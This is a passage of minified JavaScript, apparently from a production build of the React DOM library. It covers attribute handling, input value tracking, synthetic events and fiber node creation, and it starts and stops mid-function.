qn(r,a,l){if(Js(a))if(l===null)r.removeAttribute(a);else{switch(typeof l){case"undefined":case"function":case"symbol":r.removeAttribute(a);return;case"boolean":var u=a.toLowerCase().slice(0,5);if(u!=="data-"&&u!=="aria-"){r.removeAttribute(a);return}}r.setAttribute(a,""+l)}}function ni(r,a,l){if(l===null)r.removeAttribute(a);else{switch(typeof l){case"undefined":case"function":case"symbol":case"boolean":r.removeAttribute(a);return}r.setAttribute(a,""+l)}}function Ge(r,a,l,u){if(u===null)r.removeAttribute(l);else{switch(typeof u){case"undefined":case"function":case"symbol":case"boolean":r.removeAttribute(l);return}r.setAttributeNS(a,l,""+u)}}var sn,Ti;function ui(r){if(sn===void 0)try{throw Error()}catch(l){var a=l.stack.trim().match(/\n( *(at )?)/);sn=a&&a[1]||"",Ti=-1<l.stack.indexOf(`
    at`)?" (<anonymous>)":-1<l.stack.indexOf("@")?"@unknown:0:0":""}return`
`+sn+r+Ti}var kr=!1;function jt(r,a){if(!r||kr)return"";kr=!0;var l=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var u={DetermineComponentFrameRoot:function(){try{if(a){var ce=function(){throw Error()};if(Object.defineProperty(ce.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(ce,[])}catch(ne){var te=ne}Reflect.construct(r,[],ce)}else{try{ce.call()}catch(ne){te=ne}r.call(ce.prototype)}}else{try{throw Error()}catch(ne){te=ne}(ce=r())&&typeof ce.catch=="function"&&ce.catch(function(){})}}catch(ne){if(ne&&te&&typeof ne.stack=="string")return[ne.stack,te.stack]}return[null,null]}};u.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var m=Object.getOwnPropertyDescriptor(u.DetermineComponentFrameRoot,"name");m&&m.configurable&&Object.defineProperty(u.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var y=u.DetermineComponentFrameRoot(),A=y[0],S=y[1];if(A&&S){var U=A.split(`
`),J=S.split(`
`);for(m=u=0;u<U.length&&!U[u].includes("DetermineComponentFrameRoot");)u++;for(;m<J.length&&!J[m].includes("DetermineComponentFrameRoot");)m++;if(u===U.length||m===J.length)for(u=U.length-1,m=J.length-1;1<=u&&0<=m&&U[u]!==J[m];)m--;for(;1<=u&&0<=m;u--,m--)if(U[u]!==J[m]){if(u!==1||m!==1)do if(u--,m--,0>m||U[u]!==J[m]){var se=`
`+U[u].replace(" at new "," at ");return r.displayName&&se.includes("<anonymous>")&&(se=se.replace("<anonymous>",r.displayName)),se}while(1<=u&&0<=m);break}}}finally{kr=!1,Error.prepareStackTrace=l}return(l=r?r.displayName||r.name:"")?ui(l):""}function Gi(r){switch(r.tag){case 26:case 27:case 5:return ui(r.type);case 16:return ui("Lazy");case 13:return ui("Suspense");case 19:return ui("SuspenseList");case 0:case 15:return jt(r.type,!1);case 11:return jt(r.type.render,!1);case 1:return jt(r.type,!0);case 31:return ui("Activity");default:return""}}function os(r){try{var a="";do a+=Gi(r),r=r.return;while(r);return a}catch(l){return`
Error generating stack: `+l.message+`
`+l.stack}}function Dn(r){switch(typeof r){case"bigint":case"boolean":case"number":case"string":case"undefined":return r;case"object":return r;default:return""}}function Gc(r){var a=r.type;return(r=r.nodeName)&&r.toLowerCase()==="input"&&(a==="checkbox"||a==="radio")}function qp(r){var a=Gc(r)?"checked":"value",l=Object.getOwnPropertyDescriptor(r.constructor.prototype,a),u=""+r[a];if(!r.hasOwnProperty(a)&&typeof l<"u"&&typeof l.get=="function"&&typeof l.set=="function"){var m=l.get,y=l.set;return Object.defineProperty(r,a,{configurable:!0,get:function(){return m.call(this)},set:function(A){u=""+A,y.call(this,A)}}),Object.defineProperty(r,a,{enumerable:l.enumerable}),{getValue:function(){return u},setValue:function(A){u=""+A},stopTracking:function(){r._valueTracker=null,delete r[a]}}}}function ll(r){r._valueTracker||(r._valueTracker=qp(r))}function Yc(r){if(!r)return!1;var a=r._valueTracker;if(!a)return!0;var l=a.getValue(),u="";return r&&(u=Gc(r)?r.checked?"true":"false":r.value),r=u,r!==l?(a.setValue(r),!0):!1}function no(r){if(r=r||(typeof document<"u"?document:void 0),typeof r>"u")return null;try{return r.activeElement||r.body}catch{return r.body}}var Gp=/[\n"\\]/g;function an(r){return r.replace(Gp,function(a){return"\\"+a.charCodeAt(0).toString(16)+" "})}function Ci(r,a,l,u,m,y,A,S){r.name="",A!=null&&typeof A!="function"&&typeof A!="symbol"&&typeof A!="boolean"?r.type=A:r.removeAttribute("type"),a!=null?A==="number"?(a===0&&r.value===""||r.value!=a)&&(r.value=""+Dn(a)):r.value!==""+Dn(a)&&(r.value=""+Dn(a)):A!=="submit"&&A!=="reset"||r.removeAttribute("value"),a!=null?ea(r,A,Dn(a)):l!=null?ea(r,A,Dn(l)):u!=null&&r.removeAttribute("value"),m==null&&y!=null&&(r.defaultChecked=!!y),m!=null&&(r.checked=m&&typeof m!="function"&&typeof m!="symbol"),S!=null&&typeof S!="function"&&typeof S!="symbol"&&typeof S!="boolean"?r.name=""+Dn(S):r.removeAttribute("name")}function io(r,a,l,u,m,y,A,S){if(y!=null&&typeof y!="function"&&typeof y!="symbol"&&typeof y!="boolean"&&(r.type=y),a!=null||l!=null){if(!(y!=="submit"&&y!=="reset"||a!=null))return;l=l!=null?""+Dn(l):"",a=a!=null?""+Dn(a):l,S||a===r.value||(r.value=a),r.defaultValue=a}u=u??m,u=typeof u!="function"&&typeof u!="symbol"&&!!u,r.checked=S?r.checked:!!u,r.defaultChecked=!!u,A!=null&&typeof A!="function"&&typeof A!="symbol"&&typeof A!="boolean"&&(r.name=A)}function ea(r,a,l){a==="number"&&no(r.ownerDocument)===r||r.defaultValue===""+l||(r.defaultValue=""+l)}function ls(r,a,l,u){if(r=r.options,a){a={};for(var m=0;m<l.length;m++)a["$"+l[m]]=!0;for(l=0;l<r.length;l++)m=a.hasOwnProperty("$"+r[l].value),r[l].selected!==m&&(r[l].selected=m),m&&u&&(r[l].defaultSelected=!0)}else{for(l=""+Dn(l),a=null,m=0;m<r.length;m++){if(r[m].value===l){r[m].selected=!0,u&&(r[m].defaultSelected=!0);return}a!==null||r[m].disabled||(a=r[m])}a!==null&&(a.selected=!0)}}function It(r,a,l){if(a!=null&&(a=""+Dn(a),a!==r.value&&(r.value=a),l==null)){r.defaultValue!==a&&(r.defaultValue=a);return}r.defaultValue=l!=null?""+Dn(l):""}function ro(r,a,l,u){if(a==null){if(u!=null){if(l!=null)throw Error(i(92));if(Me(u)){if(1<u.length)throw Error(i(93));u=u[0]}l=u}l==null&&(l=""),a=l}l=Dn(a),r.defaultValue=l,u=r.textContent,u===l&&u!==""&&u!==null&&(r.value=u)}function Yi(r,a){if(a){var l=r.firstChild;if(l&&l===r.lastChild&&l.nodeType===3){l.nodeValue=a;return}}r.textContent=a}var so=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function sh(r,a,l){var u=a.indexOf("--")===0;l==null||typeof l=="boolean"||l===""?u?r.setProperty(a,""):a==="float"?r.cssFloat="":r[a]="":u?r.setProperty(a,l):typeof l!="number"||l===0||so.has(a)?a==="float"?r.cssFloat=l:r[a]=(""+l).trim():r[a]=l+"px"}function Qc(r,a,l){if(a!=null&&typeof a!="object")throw Error(i(62));if(r=r.style,l!=null){for(var u in l)!l.hasOwnProperty(u)||a!=null&&a.hasOwnProperty(u)||(u.indexOf("--")===0?r.setProperty(u,""):u==="float"?r.cssFloat="":r[u]="");for(var m in a)u=a[m],a.hasOwnProperty(m)&&l[m]!==u&&sh(r,m,u)}else for(var y in a)a.hasOwnProperty(y)&&sh(r,y,a[y])}function Kc(r){if(r.indexOf("-")===-1)return!1;switch(r){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var Yp=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),Qp=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function cl(r){return Qp.test(""+r)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":r}var cs=null;function Qi(r){return r=r.target||r.srcElement||window,r.correspondingUseElement&&(r=r.correspondingUseElement),r.nodeType===3?r.parentNode:r}var us=null,ds=null;function Wc(r){var a=rt(r);if(a&&(r=a.stateNode)){var l=r[pe]||null;e:switch(r=a.stateNode,a.type){case"input":if(Ci(r,l.value,l.defaultValue,l.defaultValue,l.checked,l.defaultChecked,l.type,l.name),a=l.name,l.type==="radio"&&a!=null){for(l=r;l.parentNode;)l=l.parentNode;for(l=l.querySelectorAll('input[name="'+an(""+a)+'"][type="radio"]'),a=0;a<l.length;a++){var u=l[a];if(u!==r&&u.form===r.form){var m=u[pe]||null;if(!m)throw Error(i(90));Ci(u,m.value,m.defaultValue,m.defaultValue,m.checked,m.defaultChecked,m.type,m.name)}}for(a=0;a<l.length;a++)u=l[a],u.form===r.form&&Yc(u)}break e;case"textarea":It(r,l.value,l.defaultValue);break e;case"select":a=l.value,a!=null&&ls(r,!!l.multiple,a,!1)}}}var Dr=!1;function ah(r,a,l){if(Dr)return r(a,l);Dr=!0;try{var u=r(a);return u}finally{if(Dr=!1,(us!==null||ds!==null)&&(Jh(),us&&(a=us,r=ds,ds=us=null,Wc(a),r)))for(a=0;a<r.length;a++)Wc(r[a])}}function ao(r,a){var l=r.stateNode;if(l===null)return null;var u=l[pe]||null;if(u===null)return null;l=u[a];e:switch(a){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(u=!u.disabled)||(r=r.type,u=!(r==="button"||r==="input"||r==="select"||r==="textarea")),r=!u;break e;default:r=!1}if(r)return null;if(l&&typeof l!="function")throw Error(i(231,a,typeof l));return l}var hr=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),Ki=!1;if(hr)try{var oo={};Object.defineProperty(oo,"passive",{get:function(){Ki=!0}}),window.addEventListener("test",oo,oo),window.removeEventListener("test",oo,oo)}catch{Ki=!1}var Mr=null,ta=null,hs=null;function $c(){if(hs)return hs;var r,a=ta,l=a.length,u,m="value"in Mr?Mr.value:Mr.textContent,y=m.length;for(r=0;r<l&&a[r]===m[r];r++);var A=l-r;for(u=1;u<=A&&a[l-u]===m[y-u];u++);return hs=m.slice(r,1<u?1-u:void 0)}function Or(r){var a=r.keyCode;return"charCode"in r?(r=r.charCode,r===0&&a===13&&(r=13)):r=a,r===10&&(r=13),32<=r||r===13?r:0}function Pr(){return!0}function Xc(){return!1}function _n(r){function a(l,u,m,y,A){this._reactName=l,this._targetInst=m,this.type=u,this.nativeEvent=y,this.target=A,this.currentTarget=null;for(var S in r)r.hasOwnProperty(S)&&(l=r[S],this[S]=l?l(y):y[S]);return this.isDefaultPrevented=(y.defaultPrevented!=null?y.defaultPrevented:y.returnValue===!1)?Pr:Xc,this.isPropagationStopped=Xc,this}return v(a.prototype,{preventDefault:function(){this.defaultPrevented=!0;var l=this.nativeEvent;l&&(l.preventDefault?l.preventDefault():typeof l.returnValue!="unknown"&&(l.returnValue=!1),this.isDefaultPrevented=Pr)},stopPropagation:function(){var l=this.nativeEvent;l&&(l.stopPropagation?l.stopPropagation():typeof l.cancelBubble!="unknown"&&(l.cancelBubble=!0),this.isPropagationStopped=Pr)},persist:function(){},isPersistent:Pr}),a}var Ct={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(r){return r.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ul=_n(Ct),lo=v({},Ct,{view:0,detail:0}),oh=_n(lo),dl,hl,jr,co=v({},lo,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:fo,button:0,buttons:0,relatedTarget:function(r){return r.relatedTarget===void 0?r.fromElement===r.srcElement?r.toElement:r.fromElement:r.relatedTarget},movementX:function(r){return"movementX"in r?r.movementX:(r!==jr&&(jr&&r.type==="mousemove"?(dl=r.screenX-jr.screenX,hl=r.screenY-jr.screenY):hl=dl=0,jr=r),dl)},movementY:function(r){return"movementY"in r?r.movementY:hl}}),Wi=_n(co),lh=v({},co,{dataTransfer:0}),Kp=_n(lh),uo=v({},lo,{relatedTarget:0}),fl=_n(uo),Zc=v({},Ct,{animationName:0,elapsedTime:0,pseudoElement:0}),ml=_n(Zc),ch=v({},Ct,{clipboardData:function(r){return"clipboardData"in r?r.clipboardData:window.clipboardData}}),pl=_n(ch),Wp=v({},Ct,{data:0}),Jc=_n(Wp),ho={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},uh={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},dh={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function eu(r){var a=this.nativeEvent;return a.getModifierState?a.getModifierState(r):(r=dh[r])?!!a[r]:!1}function fo(){return eu}var hh=v({},lo,{key:function(r){if(r.key){var a=ho[r.key]||r.key;if(a!=="Unidentified")return a}return r.type==="keypress"?(r=Or(r),r===13?"Enter":String.fromCharCode(r)):r.type==="keydown"||r.type==="keyup"?uh[r.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:fo,charCode:function(r){return r.type==="keypress"?Or(r):0},keyCode:function(r){return r.type==="keydown"||r.type==="keyup"?r.keyCode:0},which:function(r){return r.type==="keypress"?Or(r):r.type==="keydown"||r.type==="keyup"?r.keyCode:0}}),gl=_n(hh),fh=v({},co,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),tu=_n(fh),fs=v({},lo,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:fo}),mh=_n(fs),ph=v({},Ct,{propertyName:0,elapsedTime:0,pseudoElement:0}),gh=_n(ph),yh=v({},co,{deltaX:function(r){return"deltaX"in r?r.deltaX:"wheelDeltaX"in r?-r.wheelDeltaX:0},deltaY:function(r){return"deltaY"in r?r.deltaY:"wheelDeltaY"in r?-r.wheelDeltaY:"wheelDelta"in r?-r.wheelDelta:0},deltaZ:0,deltaMode:0}),yl=_n(yh),ii=v({},Ct,{newState:0,oldState:0}),vh=_n(ii),_h=[9,13,27,32],Lr=hr&&"CompositionEvent"in window,h=null;hr&&"documentMode"in document&&(h=document.documentMode);var _=hr&&"TextEvent"in window&&!h,x=hr&&(!Lr||h&&8<h&&11>=h),R=" ",$=!1;function ie(r,a){switch(r){case"keyup":return _h.indexOf(a.keyCode)!==-1;case"keydown":return a.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function ve(r){return r=r.detail,typeof r=="object"&&"data"in r?r.data:null}var dt=!1;function hn(r,a){switch(r){case"compositionend":return ve(a);case"keypress":return a.which!==32?null:($=!0,R);case"textInput":return r=a.data,r===R&&$?null:r;default:return null}}function ht(r,a){if(dt)return r==="compositionend"||!Lr&&ie(r,a)?(r=$c(),hs=ta=Mr=null,dt=!1,r):null;switch(r){case"paste":return null;case"keypress":if(!(a.ctrlKey||a.altKey||a.metaKey)||a.ctrlKey&&a.altKey){if(a.char&&1<a.char.length)return a.char;if(a.which)return String.fromCharCode(a.which)}return null;case"compositionend":return x&&a.locale!=="ko"?null:a.data;default:return null}}var wn={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function fn(r){var a=r&&r.nodeName&&r.nodeName.toLowerCase();return a==="input"?!!wn[r.type]:a==="textarea"}function ms(r,a,l,u){us?ds?ds.push(u):ds=[u]:us=u,a=af(a,"onChange"),0<a.length&&(l=new ul("onChange","change",null,l,u),r.push({event:l,listeners:a}))}var Mn=null,Vr=null;function nu(r){u1(r,0)}function wh(r){var a=Tt(r);if(Yc(a))return r}function kw(r,a){if(r==="change")return a}var Dw=!1;if(hr){var $p;if(hr){var Xp="oninput"in document;if(!Xp){var Mw=document.createElement("div");Mw.setAttribute("oninput","return;"),Xp=typeof Mw.oninput=="function"}$p=Xp}else $p=!1;Dw=$p&&(!document.documentMode||9<document.documentMode)}function Ow(){Mn&&(Mn.detachEvent("onpropertychange",Pw),Vr=Mn=null)}function Pw(r){if(r.propertyName==="value"&&wh(Vr)){var a=[];ms(a,Vr,r,Qi(r)),ah(nu,a)}}function wR(r,a,l){r==="focusin"?(Ow(),Mn=a,Vr=l,Mn.attachEvent("onpropertychange",Pw)):r==="focusout"&&Ow()}function bR(r){if(r==="selectionchange"||r==="keyup"||r==="keydown")return wh(Vr)}function xR(r,a){if(r==="click")return wh(a)}function AR(r,a){if(r==="input"||r==="change")return wh(a)}function ER(r,a){return r===a&&(r!==0||1/r===1/a)||r!==r&&a!==a}var Si=typeof Object.is=="function"?Object.is:ER;function iu(r,a){if(Si(r,a))return!0;if(typeof r!="object"||r===null||typeof a!="object"||a===null)return!1;var l=Object.keys(r),u=Object.keys(a);if(l.length!==u.length)return!1;for(u=0;u<l.length;u++){var m=l[u];if(!Er.call(a,m)||!Si(r[m],a[m]))return!1}return!0}function jw(r){for(;r&&r.firstChild;)r=r.firstChild;return r}function Lw(r,a){var l=jw(r);r=0;for(var u;l;){if(l.nodeType===3){if(u=r+l.textContent.length,r<=a&&u>=a)return{node:l,offset:a-r};r=u}e:{for(;l;){if(l.nextSibling){l=l.nextSibling;break e}l=l.parentNode}l=void 0}l=jw(l)}}function Vw(r,a){return r&&a?r===a?!0:r&&r.nodeType===3?!1:a&&a.nodeType===3?Vw(r,a.parentNode):"contains"in r?r.contains(a):r.compareDocumentPosition?!!(r.compareDocumentPosition(a)&16):!1:!1}function Uw(r){r=r!=null&&r.ownerDocument!=null&&r.ownerDocument.defaultView!=null?r.ownerDocument.defaultView:window;for(var a=no(r.document);a instanceof r.HTMLIFrameElement;){try{var l=typeof a.contentWindow.location.href=="string"}catch{l=!1}if(l)r=a.contentWindow;else break;a=no(r.document)}return a}function Zp(r){var a=r&&r.nodeName&&r.nodeName.toLowerCase();return a&&(a==="input"&&(r.type==="text"||r.type==="search"||r.type==="tel"||r.type==="url"||r.type==="password")||a==="textarea"||r.contentEditable==="true")}var TR=hr&&"documentMode"in document&&11>=document.documentMode,vl=null,Jp=null,ru=null,eg=!1;function Bw(r,a,l){var u=l.window===l?l.document:l.nodeType===9?l:l.ownerDocument;eg||vl==null||vl!==no(u)||(u=vl,"selectionStart"in u&&Zp(u)?u={start:u.selectionStart,end:u.selectionEnd}:(u=(u.ownerDocument&&u.ownerDocument.defaultView||window).getSelection(),u={anchorNode:u.anchorNode,anchorOffset:u.anchorOffset,focusNode:u.focusNode,focusOffset:u.focusOffset}),ru&&iu(ru,u)||(ru=u,u=af(Jp,"onSelect"),0<u.length&&(a=new ul("onSelect","select",null,a,l),r.push({event:a,listeners:u}),a.target=vl)))}function mo(r,a){var l={};return l[r.toLowerCase()]=a.toLowerCase(),l["Webkit"+r]="webkit"+a,l["Moz"+r]="moz"+a,l}var _l={animationend:mo("Animation","AnimationEnd"),animationiteration:mo("Animation","AnimationIteration"),animationstart:mo("Animation","AnimationStart"),transitionrun:mo("Transition","TransitionRun"),transitionstart:mo("Transition","TransitionStart"),transitioncancel:mo("Transition","TransitionCancel"),transitionend:mo("Transition","TransitionEnd")},tg={},zw={};hr&&(zw=document.createElement("div").style,"AnimationEvent"in window||(delete _l.animationend.animation,delete _l.animationiteration.animation,delete _l.animationstart.animation),"TransitionEvent"in window||delete _l.transitionend.transition);function po(r){if(tg[r])return tg[r];if(!_l[r])return r;var a=_l[r],l;for(l in a)if(a.hasOwnProperty(l)&&l in zw)return tg[r]=a[l];return r}var Fw=po("animationend"),Hw=po("animationiteration"),qw=po("animationstart"),CR=po("transitionrun"),SR=po("transitionstart"),NR=po("transitioncancel"),Gw=po("transitionend"),Yw=new Map,ng="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");ng.push("scrollEnd");function fr(r,a){Yw.set(r,a),dn(a,[r])}var Qw=new WeakMap;function $i(r,a){if(typeof r=="object"&&r!==null){var l=Qw.get(r);return l!==void 0?l:(a={value:r,source:a,stack:os(a)},Qw.set(r,a),a)}return{value:r,source:a,stack:os(a)}}var Xi=[],wl=0,ig=0;function bh(){for(var r=wl,a=ig=wl=0;a<r;){var l=Xi[a];Xi[a++]=null;var u=Xi[a];Xi[a++]=null;var m=Xi[a];Xi[a++]=null;var y=Xi[a];if(Xi[a++]=null,u!==null&&m!==null){var A=u.pending;A===null?m.next=m:(m.next=A.next,A.next=m),u.pending=m}y!==0&&Kw(l,m,y)}}function xh(r,a,l,u){Xi[wl++]=r,Xi[wl++]=a,Xi[wl++]=l,Xi[wl++]=u,ig|=u,r.lanes|=u,r=r.alternate,r!==null&&(r.lanes|=u)}function rg(r,a,l,u){return xh(r,a,l,u),Ah(r)}function bl(r,a){return xh(r,null,null,a),Ah(r)}function Kw(r,a,l){r.lanes|=l;var u=r.alternate;u!==null&&(u.lanes|=l);for(var m=!1,y=r.return;y!==null;)y.childLanes|=l,u=y.alternate,u!==null&&(u.childLanes|=l),y.tag===22&&(r=y.stateNode,r===null||r._visibility&1||(m=!0)),r=y,y=y.return;return r.tag===3?(y=r.stateNode,m&&a!==null&&(m=31-rn(l),r=y.hiddenUpdates,u=r[m],u===null?r[m]=[a]:u.push(a),a.lane=l|536870912),y):null}function Ah(r){if(50<Ru)throw Ru=0,uy=null,Error(i(185));for(var a=r.return;a!==null;)r=a,a=r.return;return r.tag===3?r.stateNode:null}var xl={};function RR(r,a,l,u){this.tag=r,this.key=l,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=a,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=u,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Ni(r,a,l,u){return new RR(r,a,l,u)}function sg(r){return r=r.prototype,!(!r||!r.isReactComponent)}function ps(r,a){var l=r.alternate;return l===null?(l=Ni(r.tag,a,r.key,r.mode),l.elementType=r.elementType,l.type=r.type,l.stateNode=r.stateNode,l.alternate=r,r.alternate=l):(l.pendingProps=a,l.type=r.type,l.flags=0,l.subtreeFlags=0,l.deletions=null),l.flags=r.flags&65011712,l.childLanes=r.childLanes,l.lanes=r.lanes,l.child=r.child,l.memoizedProps=r.memoizedProps,l.memoizedState=r.memoizedState,l.updateQueue=r.updateQueue,a=r.dependencies,l.dependencies=a===null?null:{lanes:a.lanes,firstContext:a.firstContext},l.sibling=r.sibling,l.index=r.index,l.ref=r.ref,l.refCleanup=r.refCleanup,l}function Ww(r,a){r.flags&=65011714;var l=r.alternate;return l===null?(r.childLanes=0,r.lanes=a,r.child=null,r.subtreeFlags=0,r.memoizedProps=null,r.memoizedState=null,r.updateQueue=null,r.dependencies=null,r.stateNode=null):(r.childLanes=l.childLanes,r.lanes=l.lanes,r.child=l.child,r.subtreeFlags=0,r.deletions=null,r.memoizedProps=l.memoizedProps,r.memoizedState=l.memoizedState,r.updateQueue=l.updateQueue,r.type=l.type,a=l.dependencies,r.dependencies=a===null?null:{lanes:a.lanes,firstContext:a.firstContext}),r}function Eh(r,a,l,u,m,y){var A=0;if(u=r,typeof r=="function")sg(r)&&(A=1);else if(typeof r=="string")A=k3(r,l,Te.current)?26:r==="html"||r==="head"||r==="body"?27:5;else e:switch(r){case k:return r=Ni(31,l,a,m),r.elementType=k,r.lanes=y,r;case C:return go(l.children,m,y,a);case M:A=8,m|=24;break;case V:return r=Ni(12,l,a,m|2),r.elementType=V,r.lanes=y,r;case G:return r=Ni(13,l,a,m),r.elementType=G,r.lanes=y,r;case L:return r=Ni(19,l,a,m),r.elementType=L,r.lanes=y,r;default:if(typeof r=="object"&&r!==null)switch(r.$$typeof){case B:case D:A=10;break e;case Y:A=9;break e;case Q:A=11;break e;case N:A=14;break e;case T:A=16,u=null;break e}A=29,l=Error(i(130,r===null?"null":typeof r,"")),u=null}return a=Ni(A,l,a,m),a.elementType=r,a.type=u,a.lanes=y,a}function go(r,a,l,u){return r=Ni(7,r,u,a),r.lanes=l,r}function ag(r,a,l){return r=Ni(6,r,null,a),r.lanes=l,r}function og(r,a,l){return a=Ni(4,r.children!==null?r.children:[],r.key,a),a.lanes=l,a.stateNode={containerInfo:r.containerInfo,pendingChildren:null,implementation:r.implementation},a}var Al=[],El=0,Th=null,Ch=0,Zi=[],Ji=0,yo=null,gs=1,ys="";function vo(r,a){Al[El++]=Ch,Al[El++]=Th,Th=r,Ch=a}function $w(r,a,l){Zi[Ji++]=gs,Zi[Ji++]=ys,Zi[Ji++]=yo,yo=r;var u=gs;r=ys;var m=32-rn(u)-1;u&=~(1<<m),l+=1;var y=32-rn(a)+m;if(30<y){var A=m-m%5;y=(u&(1<<A)-1).toString(32),u>>=A,m-=A,gs=1<<32-rn(a)+m|l<<m|u,ys=y+r}else gs=1<<y|l<<m|u,ys=r}function 